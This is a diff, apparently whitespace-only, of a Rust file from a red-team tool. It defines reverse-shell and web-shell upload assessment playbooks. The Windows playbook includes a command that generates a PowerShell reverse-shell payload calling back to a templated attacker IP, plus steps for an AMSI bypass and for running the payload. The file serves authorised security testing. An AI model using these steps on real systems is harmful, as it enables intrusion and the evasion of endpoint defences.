@@ -10,7 +10,7 @@ use crate::scripts::FindingSeverity;
 /// Simulates establishing a reverse shell on a Linux target.
 /// Used to test: egress filtering, endpoint detection, shell execution monitoring.
 pub fn reverse_shell_linux() -> Playbook {
-    Playbook::new("reverse-shell-linux", "Reverse Shell Assessment (Linux)")
+  Playbook::new("reverse-shell-linux", "Reverse Shell Assessment (Linux)")
         .with_description("Assess ability to establish and maintain reverse shell access on Linux systems")
         .with_objective("Validate network egress controls and endpoint detection capabilities by attempting to establish outbound shell connections")
         .for_target(TargetType::Host)
@@ -148,93 +148,93 @@ pub fn reverse_shell_linux() -> Playbook {
 ///
 /// Simulates establishing a reverse shell on a Windows target.
 pub fn reverse_shell_windows() -> Playbook {
-    Playbook::new(
-        "reverse-shell-windows",
-        "Reverse Shell Assessment (Windows)",
-    )
-    .with_description(
-        "Assess ability to establish and maintain reverse shell access on Windows systems",
-    )
-    .with_objective(
-        "Validate Windows Defender, AMSI, and network controls against reverse shell attempts",
-    )
-    .for_target(TargetType::Host)
-    .for_os(TargetOS::Windows)
-    .with_risk(RiskLevel::High)
-    .with_duration("15-45 minutes")
-    .with_mitre("T1059.001") // PowerShell
-    .with_mitre("T1071.001")
-    .add_precondition(PreCondition::new("Target Windows system is reachable"))
-    .add_precondition(PreCondition::new(
-        "Attack machine ready for incoming connections",
-    ))
-    .add_step(
-        PlaybookStep::new(1, PlaybookPhase::Recon, "Egress Analysis")
-            .with_description("Identify allowed egress paths")
-            .with_command("rb network ports scan {{ attacker_ip }} --from-target")
-            .with_success("Egress path identified")
-            .collects(EvidenceType::NetworkMap)
-            .with_mitre("T1046", None),
-    )
-    .add_step(
-        PlaybookStep::new(2, PlaybookPhase::Execution, "Generate PowerShell Payload")
-            .with_description("Create encoded PowerShell reverse shell")
-            .with_command("rb exploit payload shell powershell {{ attacker_ip }} {{ port }}")
-            .with_success("Encoded payload ready")
-            .depends(1)
-            .collects(EvidenceType::FileArtifact)
-            .with_mitre("T1059.001", Some("Generate PowerShell payload")),
-    )
-    .add_step(
-        PlaybookStep::new(3, PlaybookPhase::Execution, "AMSI Bypass (if needed)")
-            .with_description("Bypass AMSI if payload is blocked")
-            .with_manual("Use AMSI bypass technique before payload execution")
-            .with_success("AMSI bypassed")
-            .optional()
-            .collects(EvidenceType::CommandOutput)
-            .with_mitre("T1562.001", Some("Disable or Modify Tools")),
-    )
-    .add_step(
-        PlaybookStep::new(4, PlaybookPhase::Execution, "Execute Payload")
-            .with_description("Run reverse shell payload on target")
-            .with_manual("Execute via cmd.exe, PowerShell, or exploit")
-            .with_success("Payload executed")
-            .depends(2)
-            .collects(EvidenceType::CommandOutput)
-            .with_mitre("T1059.001", None),
-    )
-    .add_step(
-        PlaybookStep::new(5, PlaybookPhase::Execution, "Verify Connection")
-            .with_description("Confirm shell connection established")
-            .with_manual("Check for incoming connection on listener")
-            .with_success("Shell active - run 'whoami' to verify")
-            .depends(4)
-            .collects(EvidenceType::SessionData)
-            .with_mitre("T1071.001", None),
-    )
-    .add_evidence(
-        ExpectedEvidence::new("Windows reverse shell")
-            .at("Attacker listener")
-            .with_indicator("cmd.exe or PowerShell prompt from target")
-            .severity(FindingSeverity::Critical),
-    )
-    .add_failed_control(
-        FailedControl::new("AMSI Protection", "AMSI bypass successful")
-            .with_fix("Keep AMSI updated, use additional endpoint protection"),
-    )
-    .add_failed_control(
-        FailedControl::new("PowerShell Logging", "Malicious PowerShell not logged")
-            .with_fix("Enable PowerShell Script Block Logging and Module Logging"),
-    )
-    .with_kill_chain(KillChainPhase::Exploitation())
-    .with_kill_chain(KillChainPhase::CommandAndControl())
+  Playbook::new(
+    "reverse-shell-windows",
+    "Reverse Shell Assessment (Windows)",
+  )
+  .with_description(
+    "Assess ability to establish and maintain reverse shell access on Windows systems",
+  )
+  .with_objective(
+    "Validate Windows Defender, AMSI, and network controls against reverse shell attempts",
+  )
+  .for_target(TargetType::Host)
+  .for_os(TargetOS::Windows)
+  .with_risk(RiskLevel::High)
+  .with_duration("15-45 minutes")
+  .with_mitre("T1059.001") // PowerShell
+  .with_mitre("T1071.001")
+  .add_precondition(PreCondition::new("Target Windows system is reachable"))
+  .add_precondition(PreCondition::new(
+    "Attack machine ready for incoming connections",
+  ))
+  .add_step(
+    PlaybookStep::new(1, PlaybookPhase::Recon, "Egress Analysis")
+      .with_description("Identify allowed egress paths")
+      .with_command("rb network ports scan {{ attacker_ip }} --from-target")
+      .with_success("Egress path identified")
+      .collects(EvidenceType::NetworkMap)
+      .with_mitre("T1046", None),
+  )
+  .add_step(
+    PlaybookStep::new(2, PlaybookPhase::Execution, "Generate PowerShell Payload")
+      .with_description("Create encoded PowerShell reverse shell")
+      .with_command("rb exploit payload shell powershell {{ attacker_ip }} {{ port }}")
+      .with_success("Encoded payload ready")
+      .depends(1)
+      .collects(EvidenceType::FileArtifact)
+      .with_mitre("T1059.001", Some("Generate PowerShell payload")),
+  )
+  .add_step(
+    PlaybookStep::new(3, PlaybookPhase::Execution, "AMSI Bypass (if needed)")
+      .with_description("Bypass AMSI if payload is blocked")
+      .with_manual("Use AMSI bypass technique before payload execution")
+      .with_success("AMSI bypassed")
+      .optional()
+      .collects(EvidenceType::CommandOutput)
+      .with_mitre("T1562.001", Some("Disable or Modify Tools")),
+  )
+  .add_step(
+    PlaybookStep::new(4, PlaybookPhase::Execution, "Execute Payload")
+      .with_description("Run reverse shell payload on target")
+      .with_manual("Execute via cmd.exe, PowerShell, or exploit")
+      .with_success("Payload executed")
+      .depends(2)
+      .collects(EvidenceType::CommandOutput)
+      .with_mitre("T1059.001", None),
+  )
+  .add_step(
+    PlaybookStep::new(5, PlaybookPhase::Execution, "Verify Connection")
+      .with_description("Confirm shell connection established")
+      .with_manual("Check for incoming connection on listener")
+      .with_success("Shell active - run 'whoami' to verify")
+      .depends(4)
+      .collects(EvidenceType::SessionData)
+      .with_mitre("T1071.001", None),
+  )
+  .add_evidence(
+    ExpectedEvidence::new("Windows reverse shell")
+      .at("Attacker listener")
+      .with_indicator("cmd.exe or PowerShell prompt from target")
+      .severity(FindingSeverity::Critical),
+  )
+  .add_failed_control(
+    FailedControl::new("AMSI Protection", "AMSI bypass successful")
+      .with_fix("Keep AMSI updated, use additional endpoint protection"),
+  )
+  .add_failed_control(
+    FailedControl::new("PowerShell Logging", "Malicious PowerShell not logged")
+      .with_fix("Enable PowerShell Script Block Logging and Module Logging"),
+  )
+  .with_kill_chain(KillChainPhase::Exploitation())
+  .with_kill_chain(KillChainPhase::CommandAndControl())
 }
 
 /// Web Shell Upload Assessment
 ///
 /// Tests ability to upload and execute a webshell through file upload functionality.
 pub fn webshell_upload() -> Playbook {
-    Playbook::new("webshell-upload", "Web Shell Upload Assessment")
+  Playbook::new("webshell-upload", "Web Shell Upload Assessment")
         .with_description("Assess file upload security controls by attempting webshell deployment")
         .with_objective("Validate file upload restrictions and web application firewall rules against webshell attacks")
         .for_target(TargetType::WebApp)
